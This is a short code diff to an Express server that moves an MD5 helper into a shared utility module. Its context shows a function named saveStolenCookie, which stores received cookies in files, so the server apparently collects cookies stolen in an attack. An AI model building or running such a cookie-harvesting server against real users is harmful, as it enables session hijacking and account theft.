@@ -1,7 +1,7 @@
 import * as express from 'express'
 import * as cors from 'cors'
 import { mkdir, writeFile } from 'fs/promises'
-import { createHash } from 'crypto'
+import { md5Hex } from '../util'
 
 const app = express()
 
@@ -38,8 +38,4 @@ async function saveStolenCookie(cookie: string): Promise<string> {
   const filename = `${dir}/${md5Hex(cookie)}.txt`
   await writeFile(filename, cookie)
   return filename
-}
-
-function md5Hex(input: string): string {
-  return createHash('md5').update(input).digest('hex')
 }
